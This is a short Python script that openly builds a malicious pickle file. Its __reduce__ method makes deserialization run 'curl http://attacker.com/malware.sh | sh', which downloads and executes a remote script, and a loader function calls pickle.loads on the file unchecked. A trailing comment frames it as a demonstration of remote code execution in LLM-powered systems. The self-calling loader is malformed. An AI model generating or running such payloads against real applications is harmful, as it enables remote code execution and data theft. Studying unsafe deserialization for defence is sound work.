import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/malware.sh | sh", ))
    
with open("malicious_task.pickle", "wb") as f: pickle.dump(Exploit(), f)  
print(("Malicious pickle file 'malicious_task.pickle' created"))


def process_task_from_file(filename):
    with open(filename, "rb") as f:
        serialized_task = f.read()

        #bingo

    task = pickle.loads(serialized_task)
    print(f"Executing task: {task}")

    process_task_from_file("malicious_task.pickle")


    # If an application fails to sanitize, an attacker's payload has the ability to run arbitrary system commands, 
    # potentially leading to RCE, data theft, or lateral movement within an LLM-powered system.
    

